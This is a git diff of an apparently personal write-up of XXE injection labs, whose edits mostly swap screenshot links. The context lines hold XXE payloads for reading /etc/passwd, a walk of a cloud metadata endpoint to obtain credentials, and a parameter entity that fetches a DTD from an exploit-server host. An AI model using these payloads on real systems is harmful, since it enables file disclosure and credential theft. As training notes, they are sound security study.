@@ -6,7 +6,7 @@ ______________
 
     The vulnerability in this exercise is located on the check store, let's capture the request with **Burp Suite**
 
-![[Captura de pantalla 2026-04-08 154958.png]]
+<img width="710" height="418" alt="Captura de pantalla 2026-04-08 154958" src="https://github.com/user-attachments/assets/dd9290fc-96a5-4fa9-bfbf-76a1056abcc4" />
 
 - As principal we see a **XML declaration** and behind twe find the **Elements**, we will work on this.
 
@@ -28,11 +28,11 @@ ______________
 
      We use the wrapper file to list the /etc/passwd
 
-![[Captura de pantalla 2026-04-08 161612.png]]
+<img width="1353" height="444" alt="Captura de pantalla 2026-04-08 161612" src="https://github.com/user-attachments/assets/45806d2a-f912-458c-9bec-dadbbb1f7555" />
 
 - Is reporting us successfully the **/etc/passwd**
 
-![[Captura de pantalla 2026-04-08 161642.png]]
+<img width="1196" height="279" alt="Captura de pantalla 2026-04-08 161642" src="https://github.com/user-attachments/assets/e108f05d-8094-4e0e-a04a-a96516c42be6" />
 
 - This exercise represents a basic **XML external entity (XXE) injection**
 
@@ -48,12 +48,12 @@ _________________
 
      leak in this exercise is located on the **check store**, let's capture the request with **burpsuite**
 
-![[Captura de pantalla 2026-04-08 235720.png]]
-     Typical XML structure, let's modify it
+<img width="917" height="412" alt="Captura de pantalla 2026-04-08 235720" src="https://github.com/user-attachments/assets/fea80d3d-a4aa-427b-8944-a8d19fb1d283" />
+    Typical XML structure, let's modify it
 
 - We use **SYSTEM** to force the **XML processor** to load data from an external resource (local file or remote URL).
 
-![[Captura de pantalla 2026-04-08 235208.png]]
+<img width="962" height="432" alt="Captura de pantalla 2026-04-08 235208" src="https://github.com/user-attachments/assets/02fe0e58-f19c-4488-ba8b-4a5260f21880" />
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -61,7 +61,7 @@ _________________
 <stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
 ```
 
-![[Captura de pantalla 2026-04-08 235307.png]]
+<img width="962" height="308" alt="Captura de pantalla 2026-04-08 235307" src="https://github.com/user-attachments/assets/0c5113f0-402b-4f63-a97e-97552bb998fe" />
 
 
 - Due to we are using a **metadata endpoint IP** (Which is used to get server information) our request is taken by the API and once the cloud response as we are not requesting something specific the cloud will report what she got in that directory, in this case `latest`. Finally as our request work on the **productID** request, the response will come as **product ID** 
@@ -73,11 +73,11 @@ _________________
 
 - In accordance with this information, we will continue sending requests with the **Cloud response** till get the credentials 
 
-![[Captura de pantalla 2026-04-08 235520.png]]
+<img width="1238" height="433" alt="Captura de pantalla 2026-04-08 235520" src="https://github.com/user-attachments/assets/392f15ed-4630-4f3a-a8f5-290725171d9b" />
 
 - We got the credentials, now let's reload the main page.
 
-![[Captura de pantalla 2026-04-08 235600.png]]
+<img width="1231" height="251" alt="Captura de pantalla 2026-04-08 235600" src="https://github.com/user-attachments/assets/319e1323-f800-45c6-ba40-65718583d207" />
 
 ## Key point
 
@@ -91,7 +91,7 @@ _______________
 
      As the leak resides on the check store let's capture the request with **Burpsuite**
 
-![[Captura de pantalla 2026-04-09 200534 1.png]]
+<img width="690" height="381" alt="Captura de pantalla 2026-04-09 200534 1" src="https://github.com/user-attachments/assets/223638d0-e252-4e90-adca-4047f34b398e" />
      Regular **XML** structure 
 
 - Let's make a proof with a tipycal **DTD** requesting the **/etc/passwd**
@@ -102,7 +102,7 @@ _______________
 <stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
 ```
 
-![[Captura de pantalla 2026-04-09 201534.png]]
+<img width="377" height="95" alt="Captura de pantalla 2026-04-09 201534" src="https://github.com/user-attachments/assets/775ee836-6123-4061-938e-c7aa354e2894" />
 
 >`Entities are not allowed for security reasons` as response by the system give us a relly important clue, it shows us how not to attack.
 
@@ -117,11 +117,11 @@ _______________
 
 - Here we have the key to solve this exercise, let's dive in. In this exerxise we are applying the concept of **Two entitys** which is really useful, first we declare the request of **/etc/passwd** and in the second declaration is where we **leverage of the error**, we request a file that it does not exist and after we call the first declaration, that way once the system recognize the error this will continue with our declaration and will report the **/etc/passwd**
 
-![[Captura de pantalla 2026-04-09 194039 1.png]]
+<img width="1277" height="654" alt="Captura de pantalla 2026-04-09 194039 1" src="https://github.com/user-attachments/assets/87ed5530-a768-4eda-84ec-74dec2832d87" />
 
 - Now we need to get the link of our **exploit-server**
 
-![[Captura de pantalla 2026-04-09 193946.png]]
+<img width="867" height="163" alt="Captura de pantalla 2026-04-09 193946" src="https://github.com/user-attachments/assets/f9ab1a47-0e76-4da5-a48e-a1533c3f22c2" />
 
 ```
 https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit
@@ -131,7 +131,7 @@ https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit
 
      In this point it's important to remenber  the clue we found initially `Entities are not allowed for security reasons` . For this reason we can not call the **DTD** as **&xxe;** (**general entitys**), actually we don't need to call it, it's already iamong the **brackets** and this away this one will execute the external one (that one on the **exploit-server**). This is known as **parametric entities**
  
-![[Captura de pantalla 2026-04-09 200450.png]]
+<img width="1851" height="458" alt="Captura de pantalla 2026-04-09 200450" src="https://github.com/user-attachments/assets/4b5e1fe4-2eda-40b1-9489-e86fa82faf76" />
 
 ```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit">  %xxe;]>
@@ -139,7 +139,7 @@ https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit
 
 - We receive the **/etc/passwd**, let's reload the page.
 
-![[Captura de pantalla 2026-04-09 202320.png]]
+<img width="1233" height="286" alt="Captura de pantalla 2026-04-09 202320" src="https://github.com/user-attachments/assets/5ee3e71b-442a-42bf-84b1-81c937cd5908" />
 
 - Exercise is solved successfully.
 
@@ -152,7 +152,7 @@ ________________
 
 - Leak is on the **Check store** let's capture the request with **Burpsuite**
 
-![[Captura de pantalla 2026-04-09 214332.png]]
+<img width="683" height="312" alt="Captura de pantalla 2026-04-09 214332" src="https://github.com/user-attachments/assets/5a59ccde-47e6-474a-a91c-5beba1282967" />
 
 - Before we use to see the **XML structure** in the request, right now due to the security measures it's not available for us but and here is the magic key, even **if the XML is embeded** if we have access to parameters in use in the **XML structure** and this ones are not protected we can inject exploits in there.
 
@@ -164,24 +164,25 @@ ________________
 
 [PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
 
-![[Captura de pantalla 2026-04-09 214244.png]]
+<img width="1508" height="458" alt="Captura de pantalla 2026-04-09 214244" src="https://github.com/user-attachments/assets/e59e4fae-40c3-45ff-b09f-13c491bcbc06" />
 
 - We got the /etc/passwd as response, ito worked. now let's reload the main page
 
-![[Captura de pantalla 2026-04-09 221619 1.png]]
+<img width="1278" height="256" alt="Captura de pantalla 2026-04-09 221619 1" src="https://github.com/user-attachments/assets/48c2bfd6-d263-46a6-abe5-c4f2f6ee88ea" />
+
 
 ______________
 # Lab: Exploiting XXE via image file upload
 
 - In this exercise we leverage the fact some applications allow users to upload files and Images in formats like **.png .jpeg** and **.svg** in specific too which is the key of this exercise. As the composition of a **.svg** images is completely **XML** we can use to inject **malicious XML** 
 
-![[Captura de pantalla 2026-04-10 224454.png]]
+<img width="748" height="755" alt="Captura de pantalla 2026-04-10 224454" src="https://github.com/user-attachments/assets/4340a3e5-080d-4f4c-b4c9-550a6619c3a7" />
 
 - This exercise has a panel to add commentaries and uploads Images, with the purposes of this exercise let's download an **.svg image** 
 
-![[Captura de pantalla 2026-04-10 224204.png]]
+<img width="655" height="594" alt="Captura de pantalla 2026-04-10 224204" src="https://github.com/user-attachments/assets/e03342f0-5eff-4fd8-bcc3-3bde9f647535" />
 
-![[Captura de pantalla 2026-04-10 224411 1.png]]
+<img width="1440" height="131" alt="Captura de pantalla 2026-04-10 224411 1" src="https://github.com/user-attachments/assets/fdff5b56-3d0a-4c41-a66a-74508a9f6882" />
 
 - Once we download the image, we need to change the content for the next **malicious payload**
 
@@ -198,18 +199,19 @@ ______________
 
 - When we post the comment, let's see the comment and something important to highlight is the image, we need to examine it 
 
-![[Captura de pantalla 2026-04-10 224411.png]]
-![[Captura de pantalla 2026-04-10 224532.png]]
+<img width="1440" height="131" alt="Captura de pantalla 2026-04-10 224411" src="https://github.com/user-attachments/assets/df0c2d03-e482-449b-8aef-697c8a73381a" />
 
-![[Captura de pantalla 2026-04-10 224634.png]]
+<img width="842" height="101" alt="Captura de pantalla 2026-04-10 224532" src="https://github.com/user-attachments/assets/e405aa11-83ee-44f3-9e85-39649628ae14" />
+
+<img width="772" height="554" alt="Captura de pantalla 2026-04-10 224634" src="https://github.com/user-attachments/assets/1137274b-6efa-4c5c-9902-ca66a8f6a340" />
 
 - The malicious request is requesting the `/etc/hostname` and this what the image is showing us, let's paste it on the main page 
 
-![[Captura de pantalla 2026-04-10 223819.png]]
+<img width="502" height="198" alt="Captura de pantalla 2026-04-10 223819" src="https://github.com/user-attachments/assets/751f88c7-b79d-4740-ba8d-42c6a20353ef" />
 
 - Page accepted our input, exercise solved
 
-![[Captura de pantalla 2026-04-09 221619 1.png]]
+<img width="1278" height="256" alt="Captura de pantalla 2026-04-09 221619 1" src="https://github.com/user-attachments/assets/b288fe2a-b297-4642-8edb-b65980deda59" />
 
 ## Key point
 
@@ -223,8 +225,8 @@ ___________
 
      Let's capture the **stockCheck** request with **Burpsuite** 
 
-![[Captura de pantalla 2026-04-11 191344.png]]
-      Regular **XML structure** 
+<img width="675" height="401" alt="Captura de pantalla 2026-04-11 191344" src="https://github.com/user-attachments/assets/03d0d2b9-b331-4bd5-9cf6-343b875f1924" />
+       Regular **XML structure** 
 
 - We leverage the system relies in **internals DTD's** as security measure in order to execute an **internal DTD** as **Trojan horse** and after execute the **main attack**, but before do that we need to test an **internal DTD**
 
@@ -233,7 +235,7 @@ ___________
 ```
      Internal DTD script
 
-![[Captura de pantalla 2026-04-11 191217 1.png]]
+<img width="1220" height="425" alt="Captura de pantalla 2026-04-11 191217 1" src="https://github.com/user-attachments/assets/5d08f8d4-63f4-4fc8-8e8d-2616e2290b84" />
 
 - We receive a **Status code 200** , we confirm the web site **security measure** we expected, now let's proceed to build the **main attack** 
 
@@ -263,11 +265,11 @@ ___________
 
 - Let's run the request.
 
-![[Captura de pantalla 2026-04-11 181654 1.png]]
+<img width="1684" height="565" alt="Captura de pantalla 2026-04-11 181654 1" src="https://github.com/user-attachments/assets/a61a3ac4-ba28-4064-ad0e-36718fe6e45d" />
 
 - It worked successfully.
 
-![[Captura de pantalla 2026-04-11 181736.png]]
+<img width="1200" height="215" alt="Captura de pantalla 2026-04-11 181736" src="https://github.com/user-attachments/assets/aceb61a0-7483-4eec-995f-efcba3082450" />
 
 ## Key points
 
